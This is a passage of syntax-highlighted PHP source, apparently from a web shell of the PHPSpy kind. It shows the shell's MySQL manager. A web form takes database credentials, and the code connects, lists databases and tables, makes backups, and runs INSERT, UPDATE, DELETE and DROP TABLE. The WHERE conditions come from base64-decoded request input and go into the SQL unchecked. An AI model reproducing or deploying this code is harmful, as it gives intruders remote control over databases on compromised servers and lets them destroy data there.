<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fileurl</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #ff9da4; font-weight: bold;">SA_ROOT</span>,<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">path</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Database has success backup to &lt;a href="'</span>.$<span style="color: #ffeead;">fileurl</span>.<span style="color: #99ffff;">'" target=</span><span style="color: #99ffff; text-decoration: underline;">"_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">path</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">mysql_close(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Backup failed'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">insert</span> &amp;&amp; $<span style="color: #ffeead;">insertsql</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">keystr</span> = $<span style="color: #ffeead;">valstr</span> = $<span style="color: #ffeead;">tmp</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">insertsql</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span> =&gt; $<span style="color: #ffeead;">val</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">val</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">keystr</span> .= $<span style="color: #ffeead;">tmp</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">key</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">valstr</span> .= $<span style="color: #ffeead;">tmp</span>.<span style="color: #99ffff;">"'"</span>.<span style="color: #ffffff; background-color: #002451;">addslashes(</span>$<span style="color: #ffeead;">val</span>).<span style="color: #99ffff;">"'"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tmp</span> = <span style="color: #99ffff;">','</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">keystr</span> &amp;&amp; $<span style="color: #ffeead;">valstr</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>,$<span style="color: #ffeead;">charset</span>,$<span style="color: #ffeead;">dbpo</span><span style="color: #ffeead; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(q(</span><span style="color: #99ffff;">"INSERT INTO $tablename ($keystr) VALUES ($valstr)"</span>) ? <span style="color: #99ffff;">'Insert n</span><span style="color: #99ffff; text-decoration: underline;">ew record of success'</span><span style="text-decoration: underline;"> : </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">update</span> &amp;&amp; $<span style="color: #ffeead;">insertsql</span> &amp;&amp; $<span style="color: #ffeead;">base64</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">valstr</span> = $<span style="color: #ffeead;">tmp</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">insertsql</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span> =&gt; $<span style="color: #ffeead;">val</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">valstr</span> .= $<span style="color: #ffeead;">tmp</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">key</span>.<span style="color: #99ffff;">"='"</span>.<span style="color: #ffffff; background-color: #002451;">addslashes(</span>$<span style="color: #ffeead;">val</span>).<span style="color: #99ffff;">"'"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tmp</span> = <span style="color: #99ffff;">','</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">valstr</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> = <span style="color: #ffffff; background-color: #002451;">base64_decode(</span>$<span style="color: #ffeead;">base64</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>,$<span style="color: #ffeead;">charset</span>,$<span style="color: #ffeead;">dbpo</span><span style="color: #ffeead; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(q(</span><span style="color: #99ffff;">"UPDATE $tablename SET $valstr WHERE $where LIMIT 1"</span>) ? <span style="color: #99ffff;">'Record </span><span style="color: #99ffff; text-decoration: underline;">updating'</span><span style="text-decoration: underline;"> : </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'del'</span> &amp;&amp; $<span style="color: #ffeead;">base64</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> = <span style="color: #ffffff; background-color: #002451;">base64_decode(</span>$<span style="color: #ffeead;">base64</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">delete_sql</span> = <span style="color: #99ffff;">"DELETE FROM $tablename WHERE $where"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>,$<span style="color: #ffeead;">charset</span>,$<span style="color: #ffeead;">dbport</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(q(</span><span style="color: #99ffff;">"DELETE FROM $tablename WHERE $where"</span>) ? <span style="color: #99ffff;">'Deletion record of success</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;"> : </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">tablename</span> &amp;&amp; $<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'drop'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>,$<span style="color: #ffeead;">dbuser</span>,$<span style="color: #ffeead;">dbpass</span>,$<span style="color: #ffeead;">dbname</span>,$<span style="color: #ffeead;">charset</span>,$<span style="color: #ffeead;">dbport</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"DROP TABLE $tablename"</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Drop table of success'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tablename</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(mysql_error(</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'MYSQL Manager'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBHost:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbhost'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">20</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbhost</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">':'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbport'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">4</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbport</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBUser:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbuser'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">15</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbuser</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBPass:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'dbpass'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">15</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">dbpass</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'DBCharset:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeselect(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'charset'</span>,<span style="color: #99ffff;">'option'</span>=&gt;$<span style="color: #ffeead;">charsetdb</span>,<span style="color: #99ffff;">'selected'</span>=&gt;$<span style="color: #ffeead;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'connect'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #99ffff;">'Connect'</span>,<span style="color: #99ffff;">'type'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'class</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #99ffff; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'recordlist'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'doing'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'base64'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'tablename'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">dbform</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'setdbname'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">dbform</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">dbname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dbname'</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#36873;&#23450;&#34920;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'settable'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">dbform</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'tablename'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'page'</span>,$<span style="color: #ffeead;">page</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'doing'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">cachetables</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);<span style="color: #ff9da4; background-color: #003f8e;">     </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">pagenum</span> = <span style="color: #ffffff; background-color: #002451;">30</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">page</span> = <span style="color: #ffffff; background-color: #002451;">intval(</span>$<span style="color: #ffeead;">page</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">page</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">start_limit</span> = ($<span style="color: #ffeead;">page</span> - <span style="color: #ffffff; background-color: #002451;">1</span>) * $<span style="color: #ffeead;">pagenum</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">start_limit</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">page</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbhost</span>) &amp;&amp; <span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbuser</span>) &amp;&amp; <span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">dbpass</span>) &amp;&amp; <span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #ffeead;">connect</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>, $<span style="color: #ffeead;">dbuser</span>, $<span style="color: #ffeead;">dbpass</span>, $<span style="color: #ffeead;">dbname</span>, $<span style="color: #ffeead;">charset</span>, $<span style="color: #ffeead;">dbp</span><span style="color: #ffeead; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqlver</span> = <span style="color: #ffffff; background-color: #002451;">mysql_get_server_info(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;MySQL '</span>.$<span style="color: #ffeead;">mysqlver</span>.<span style="color: #99ffff;">' running in '</span>.$<span style="color: #ffeead;">dbhost</span>.<span style="color: #99ffff;">' as '</span>.$<span style="color: #ffeead;">dbuser</span>.<span style="color: #99ffff;">'@'</span>.$<span style="color: #ffeead;">dbhos</span><span style="color: #ffeead; text-decoration: underline;">t</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">highver</span> = $<span style="color: #ffeead;">mysqlver</span> &gt; <span style="color: #99ffff;">'4.1'</span> ? <span style="color: #ffffff; background-color: #002451;">1</span> : <span style="color: #ffffff; background-color: #002451;">0</span>;

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">query</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SHOW DATABASES"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbs</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbs</span>[] = <span style="color: #99ffff;">'-- Select a database --'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">db</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">query</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dbs</span>[$<span style="color: #ffeead;">db</span>[<span style="color: #99ffff;">'Database'</span>]] = $<span style="color: #ffeead;">db</span>[<span style="color: #99ffff;">'Database'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeselect(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Please select a database:'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'db[]'</span>,<span style="color: #99ffff;">'op</span><span style="color: #99ffff; text-decoration: underline;">tion'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffeead; text-decoration: underline;">dbs</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffeead; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'onchange'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #99ffff; text-decoration: underline;">'moddbname(this.options[this.selectedIndex].value)'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">dbname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.$<span style="color: #ffeead;">dbname</span>.<span style="color: #99ffff;">'\');</span><span style="color: #99ffff; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">tablename</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">' | Current Table: &lt;a href="javascript:settable(\''</span>.$<span style="color: #ffeead;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">mysql_select_db(</span>$<span style="color: #ffeead;">dbname</span>);

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">getnumsql</span> = <span style="color: #99ffff;">''</span>;
